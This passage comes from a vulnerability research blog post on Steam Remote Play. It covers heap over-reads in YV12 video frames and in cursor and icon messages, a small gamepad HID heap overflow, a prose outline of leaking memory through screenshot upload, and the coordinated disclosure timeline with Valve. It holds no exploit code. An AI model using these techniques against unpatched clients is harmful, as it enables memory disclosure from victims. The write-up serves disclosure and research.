codecs and formats are available.</p><p>Before sending video data, the host must send a <code>CStartVideoDataMsg</code> message and specify a video codec:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-protobuf data-lang=protobuf><span style=display:flex><span><span style=color:#66d9ef>message</span> <span style=color:#a6e22e>CStartVideoDataMsg</span> {<span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>	<span style=color:#66d9ef>required</span> <span style=color:#66d9ef>uint32</span> channel <span style=color:#f92672>=</span> <span style=color:#ae81ff>1</span>;<span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>	<span style=color:#66d9ef>optional</span> <span style=color:#f92672>.</span>EStreamVideoCodec codec <span style=color:#f92672>=</span> <span style=color:#ae81ff>2</span> [<span style=color:#66d9ef>default</span> <span style=color:#f92672>=</span> k_EStreamVideoCodecNone];<span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>	<span style=color:#66d9ef>optional</span> <span style=color:#66d9ef>bytes</span> codec_data <span style=color:#f92672>=</span> <span style=color:#ae81ff>3</span>;<span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>	<span style=color:#66d9ef>optional</span> <span style=color:#66d9ef>uint32</span> width <span style=color:#f92672>=</span> <span style=color:#ae81ff>4</span>;<span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>	<span style=color:#66d9ef>optional</span> <span style=color:#66d9ef>uint32</span> height <span style=color:#f92672>=</span> <span style=color:#ae81ff>5</span>;<span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>}<span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span><span style=color:#66d9ef>enum</span> EStreamVideoCodec {<span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>	k_EStreamVideoCodecNone <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;<span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>	k_EStreamVideoCodecRaw <span style=color:#f92672>=</span> <span style=color:#ae81ff>1</span>;<span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>	k_EStreamVideoCodecVP8 <span style=color:#f92672>=</span> <span style=color:#ae81ff>2</span>;    <span style=color:#75715e>// unimplemented?
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>	k_EStreamVideoCodecVP9 <span style=color:#f92672>=</span> <span style=color:#ae81ff>3</span>;    <span style=color:#75715e>// unimplemented?
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>	k_EStreamVideoCodecH264 <span style=color:#f92672>=</span> <span style=color:#ae81ff>4</span>;<span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>	k_EStreamVideoCodecHEVC <span style=color:#f92672>=</span> <span style=color:#ae81ff>5</span>;<span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>	k_EStreamVideoCodecORBX1 <span style=color:#f92672>=</span> <span style=color:#ae81ff>6</span>;  <span style=color:#75715e>// unimplemented?
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>	k_EStreamVideoCodecORBX2 <span style=color:#f92672>=</span> <span style=color:#ae81ff>7</span>;  <span style=color:#75715e>// unimplemented?
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>}<span style=color:#960050;background-color:#1e0010>
</span></span></span></code></pre></div><p>If the host chooses the <em>raw</em> codec, they can send video frames with raw pixel data over the newly opened channel. The structure for video frames becomes the following:</p><table><thead><tr><th style=text-align:left>Field</th><th style=text-align:center>Size (bytes)</th></tr></thead><tbody><tr><td style=text-align:left>Packet type (<code>k_EStreamDataPacket</code>)</td><td style=text-align:center>1</td></tr><tr><td style=text-align:left>Video sequence number</td><td style=text-align:center>2</td></tr><tr><td style=text-align:left>Timestamp</td><td style=text-align:center>4</td></tr><tr><td style=text-align:left>Unknown</td><td style=text-align:center>6</td></tr><tr><td style=text-align:left>Length of protobuf data</td><td style=text-align:center>1</td></tr><tr><td style=text-align:left>Protobuf data (<code>CVideoFormat</code>) message</td><td style=text-align:center>variable</td></tr><tr><td style=text-align:left>Raw video data</td><td style=text-align:center>variable</td></tr></tbody></table><p>First of all, the length field for the protobuf serialized data is not even checked, so the client may try to deserialize out-of-bounds heap data up to 256 bytes and crash, although this fact is unexploitable for an info leak.</p><p>The <code>CVideoFormat</code> message specifies the data format of the frame, and its dimensions:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-protobuf data-lang=protobuf><span style=display:flex><span><span style=color:#66d9ef>message</span> <span style=color:#a6e22e>CVideoFormat</span> {<span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>	<span style=color:#66d9ef>required</span> <span style=color:#f92672>.</span>EVideoFormat format <span style=color:#f92672>=</span> <span style=color:#ae81ff>1</span> [<span style=color:#66d9ef>default</span> <span style=color:#f92672>=</span> k_EVideoFormatNone];<span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>	<span style=color:#66d9ef>optional</span> <span style=color:#66d9ef>uint32</span> width <span style=color:#f92672>=</span> <span style=color:#ae81ff>2</span>;<span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>	<span style=color:#66d9ef>optional</span> <span style=color:#66d9ef>uint32</span> height <span style=color:#f92672>=</span> <span style=color:#ae81ff>3</span>;<span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>}<span style=color:#960050;background-color:#1e0010>
</span></span></span></code></pre></div><p>As shown in the codec and format tree diagram earlier, the raw codec implements two distinct encoding formats:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-protobuf data-lang=protobuf><span style=display:flex><span><span style=color:#66d9ef>enum</span> EVideoFormat {<span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>	k_EVideoFormatNone <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;<span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>	k_EVideoFormatYV12 <span style=color:#f92672>=</span> <span style=color:#ae81ff>1</span>;<span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>	k_EVideoFormatAccel <span style=color:#f92672>=</span> <span style=color:#ae81ff>2</span>;<span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>}<span style=color:#960050;background-color:#1e0010>
</span></span></span></code></pre></div><p>The vulnerability specifically lies in the <em>YV12</em> format. When frames are rendered inside <code>CStreamPlayer::BUpdateVideo</code>, here is what happens:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span><span style=color:#66d9ef>if</span> ( VideoFormat <span style=color:#f92672>==</span> k_EVideoFormatYV12 ) {
</span></span><span style=display:flex><span>  <span style=color:#75715e>// [...]
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  SDL_UpdateYUVTexture(texture, <span style=color:#ae81ff>0</span>, Yplane, Ypitch, Uplane, Upitch, Vplane, Vpitch);
</span></span><span style=display:flex><span>  SDL_RenderCopy(renderer, texture, src_rect, dst_rect);
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>The Y, U, V planes passed to <code>SDL_UpdateYUVTexture</code> are pointers to different sections inside the video data. These pointers depend on the host-provided frame dimensions.</p><blockquote><p><em>YUV, or YCbCr, is a type of color space that uses one luminance component and two chrominance components. Initially designed for television, it is more efficient than RGB for visual perception.</em></p><p><a href=/posts/img/remoteplay/YUV.jpg target=_blank><img src=/posts/img/remoteplay/YUV.jpg alt="YUV color space explanation"></a></p></blockquote><p>However, no check is performed on the size of the video data sent by the host. Thus, an attacker can specify large frame dimensions,
but send less video data than expected.</p><p><a href=/posts/img/remoteplay/yv12-overflow.png target=_blank><img src=/posts/img/remoteplay/yv12-overflow.png alt="YV12 heap overflow"></a></p><p>A heap overflow occurs inside <code>SDL_UpdateYUVTexture</code>, and a lot of heap memory is leaked.
The whole texture is rendered anyways, and the client may see something like this:</p><p><a href=/posts/img/remoteplay/video-leak.png target=_blank><img src=/posts/img/remoteplay/video-leak.png alt="YV12 video leak demo"></a></p><p>I thought of a way to exfiltrate the leak, but it&rsquo;s not the most convincing and requires an extra user interaction, hence why I may not go as far as calling the vulnerability a remote heap leak:</p><ol><li>Send a malicious <code>CStreamingClientConfig</code> message to the client that will enable the performance overlay.</li><li>Ask the client to press &ldquo;F8&rdquo;. As the performance overlay is enabled, this will silently upload a screenshot of the rendered SDL window to the host.</li><li>Listen to the <em>Stats</em> channel (<code>CDebugDumpMsg</code>) to retrieve a PNG file containing the texture, and convert the RGB pixels to YUV to read the leaked heap data.</li></ol><p>The second step can be done through various ways, such as direct social engineering, or sending fake video data that tricks the client player into pressing F8 as if it were a game mechanic&mldr; but nothing cannot be done without additional user interaction.</p><p>I also wondered whether the server had the ability to remap the victim&rsquo;s keyboard in order to trick them into uploading a screenshot by pressing any other key, but couldn&rsquo;t work it out.</p><p>Moreover, converting the leaked pixels back from RGB to YUV space is not trivial as the conversion is not lossless in practice, partly because of floating point calculation.</p><p>Similar, funny heap leaks were also found in the <code>CSetIconMsg</code> and <code>CSetCursorImageMsg</code> messages, which allow the host to send raw RGBA images to set as window icon and system cursor.</p><p>Again, both components suffer from out-of-bounds read accesses in the heap because the image data size is not properly checked. For instance, here is a leaky 128px * 128px cursor:</p><p><a href=/posts/img/remoteplay/cursor-leak.png target=_blank><img src=/posts/img/remoteplay/cursor-leak.png alt="Heap leak in <code>CSetCursorImageMsg</code>"></a></p><h2 id=heap-overflow-in-cremotehidmsg-gamepad-logic>Heap overflow in <code>CRemoteHIDMsg</code> gamepad logic</h2><p>This bug was found by fuzzing the client while an X-Box controller was plugged in (XInput device).</p><p>First, the device should be opened through a <code>CHIDMessageToRemote.DeviceOpen</code> message, by specifying a path like <code>sdl://1</code>.</p><p>When the host asks for HID input reports, the following message is sent:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-protobuf data-lang=protobuf><span style=display:flex><span><span style=color:#66d9ef>message</span> <span style=color:#a6e22e>DeviceStartInputReports</span> {<span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>  <span style=color:#66d9ef>optional</span> <span style=color:#66d9ef>uint32</span> device <span style=color:#f92672>=</span> <span style=color:#ae81ff>1</span>;<span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>  <span style=color:#66d9ef>optional</span> <span style=color:#66d9ef>uint32</span> length <span style=color:#f92672>=</span> <span style=color:#ae81ff>2</span>;<span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>}<span style=color:#960050;background-color:#1e0010>
</span></span></span></code></pre></div><p>Then, the report generator component (<code>CHIDDeviceReportGenerator</code>) collects the reports and allocates a <code>CUtlBuffer</code> object to store them, of attacker-controlled size (<code>length</code> field), but which cannot exceed 27 bytes.</p><p>Eventually, the serializing logic (<code>HIDDeviceSDLGamepadStateV2_t::Pack</code>) writes to this buffer. If the attacker provided <code>length</code> field is too small, there is an out-of-bounds write in the heap.</p><p>The overflow is very small (a few bytes) and the attacker is not in control of the written contents, which originate from a controller-specific structure (joystick axis, button data&mldr;).</p><p>This renders the exploitation very hard, but perhaps not impossible; it was not explored further.</p><h1 id=timeline>Timeline</h1><table><thead><tr><th style=text-align:left>Date            </th><th style=text-align:left></th></tr></thead><tbody><tr><td style=text-align:left>2022-10-12</td><td style=text-align:left>I submit a <strong>1st report</strong> on HackerOne about the format string & request forgery vulnerabilities.</td></tr><tr><td style=text-align:left>2022-10-18</td><td style=text-align:left>H1 analyst fails at reproducing the PoC; most likely because they did not adjust a certain function offset that varies between Steam versions (of course, the delay between the responses and the frequent Steam updates didn&rsquo;t help the case). I respond in less than an hour and offer help to analyze their DLL to find the correct offset.</td></tr><tr><td style=text-align:left>2022-11-01</td><td style=text-align:left>H1 analyst declines my help and instead asks for detailed instructions as to how they can reverse engineer the DLL themselves to find the offset.</td></tr><tr><td style=text-align:left>2022-11-01</td><td style=text-align:left>Valve staff member changes the report status to <em>Triaged</em>.</td></tr><tr><td style=text-align:left>2022-11-05</td><td style=text-align:left>I provide detailed instructions on how to retrieve the function offset needed to make the PoC work on IDA with screenshots. Not sure if this ever helped since I have never heard back from the H1 analyst (obviously Valve would have no use of such instructions since they have Steam&rsquo;s source code and PDB symbols).</td></tr><tr><td style=text-align:left>2022-11-08</td><td style=text-align:left>Valve rewards me with a bounty and pushes a fix on the Steam Client Beta channel.</td></tr><tr><td style=text-align:left>2022-11-09</td><td style=text-align:left>I take a look at the fix, and notice only the request forgery vulnerabilities have been seemingly patched: the format strings remained untouched. Since the fix is not necessarily trivial, I suggest a few ideas of potential workarounds.</td></tr><tr><td style=text-align:left>2022-12-14</td><td style=text-align:left>I come back at them after a month without news.</td></tr><tr><td style=text-align:left>2023-01-11</td><td style=text-align:left>I come back at them after two months without news. At this point I have also asked several times whether they are fine with me communicating on my findings once patches are live.</td></tr><tr><td style=text-align:left>2023-01-17</td><td style=text-align:left>Valve rewards me with an additional bonus bounty and pushes a new, working fix on the Steam Client Beta channel. However, they still pay no attention to my questions regarding disclosure and I will never get an answer.</td></tr><tr><td style=text-align:left>2023-01-20</td><td style=text-align:left>I submit a <strong>2nd report</strong> on HackerOne that gathers a few more minor vulnerabilities at once (including the heap overflows).</td></tr><tr><td style=text-align:left>2023-01-24</td><td style=text-align:left>H1 analyst asks for fully working PoCs for each single bug. I explain that I do not plan on providing those for several reasons (one of them being that developing standalone PoCs in these scenarios is highly time-consuming). I even let them know that I don&rsquo;t mind not being rewarded a bounty, as long as the bugs get through Valve so that I can communicate on them at the SSTIC conference.</td></tr><tr><td style=text-align:left>2023-03-21</td><td style=text-align:left>I come back at them after two months without news, and try to pressure them as the SSTIC deadline is getting near.</td></tr><tr><td style=text-align:left>2023-04-11</td><td style=text-align:left>H1 analyst informs me that Valve &ldquo;didn&rsquo;t reach a final decision regarding the report&rdquo; (?) and warns me that disclosure would go against H1&rsquo;s policy (actually, <a href=https://www.hackerone.com/disclosure-guidelines>their guidelines do state</a> that, for transparency reasons, finders are encouraged to disclose their reports if the team is unresponsive for around 6 months).</td></tr><tr><td style=text-align:left>2023-06-08</td><td style=text-align:left>I present my <a href=https://www.sstic.org/2023/presentation/bug_hunting_in_steam_remote_play/>work</a> at the SSTIC conference. I receive a lot of positive feedback, which motivates me to come back on my work and spend a few days looking for an RCE (which I did not have yet at this point).</td></tr><tr><td style=text-align:left>2023-06-13</td><td style=text-align:left>Valve staff member changes the 2nd report status to <em>Triaged</em> and rewards me with a bounty. Maybe they heard of my talk?</td></tr><tr><td style=text-align:left>2023-06-19</td><td style=text-align:left>I discover the file write RCE and submit a <strong>3rd report</strong> on HackerOne with a fully working PoC and a video.</td></tr><tr><td style=text-align:left>2023-06-20</td><td style=text-align:left>Valve staff member changes the 3rd report status to <em>Triaged</em> and pushes a fix to the Steam Client Beta channel (in one day!). However, they lower the severity from <em>Critical</em> to <em>High</em> and reward me with a smaller bounty. I try to explain to them that the vulnerability is indeed <em>Critical</em>, as they seem to have misunderstood a certain component of the CVSS rating system.</td></tr><tr><td style=text-align:left>2023-07-18</td><td style=text-align:left>I come back at them after a month without news. Valve won&rsquo;t reassess the severity to <em>Critical</em> (not sure why), but they do readjust the bounty correctly.</td></tr><tr><td style=text-align:left>2023-07-25</td><td style=text-align:left>Valve silently closes the 2nd report; fixes are seemingly pushed to the Steam Client Beta channel.</td></tr></tbody></table><h1 id=conclusion>Conclusion</h1><p>In this blog post, we have covered several captivating aspects of vulnerability research:</p><ul><li>choosing a target and delimiting an attack surface;</li><li>reverse engineering a product to bring out its software architecture;</li><li>reverse engineering a protocol and constructing a partial specification;</li><li>deducing a minimalist implementation to communicate with the client (or server);</li><li>building a fuzzer upon all this work;</li><li>analyzing crashes, exploiting bugs and assessing risk.</li></ul><p>On a more personal note, I find it very satisfying to start analyzing such a product from zero and being able to progressively disentangle so much hidden knowledge, up to a point where you become able to do all the things listed above.</p><p>Regarding Valve, I had read many complaints from other security researchers about them being awfully slow to validate reports and all other kinds of terrible experiences, so I didn&rsquo;t get my hopes too high up when I began submitting my reports.</p><p>Although my experience with the reporting and the coordinated vulnerability disclosure was not perfect, I was still pleasantly surprised by how fast some of my reports were treated (the more critical ones) and the bounties paid.</p></div><footer class=post-footer><div class=post-footer-data><div class=tags><div class=tag><a href=/tags/reverse-engineering>#Reverse Engineering</a></div><div class=tag><a href=/tags/vulnerability-research>#Vulnerability Research</a></div><div class=tag><a href=/tags/rce>#RCE</a></div></div><span class=date>2023-12-04
<span class=author>by
Valentino Ricotta</span></span></div></footer></article><footer><div class=social-links-footer><a href=mailto:contact@thalium.re><div class=social-link>Email</div></a><a href=https://github.com/thalium target=_blank><div class=social-link>GitHub</div></a><a href=https://twitter.com/thalium_team target=_blank><div class=social-link>Twitter</div></a></div><div class=copyright>Copyright (c) 2024, all rights reserved.</div><div class=poweredby>Powered by <a href=https://gohugo.io/>Hugo</a>.</div></footer></div></body></html>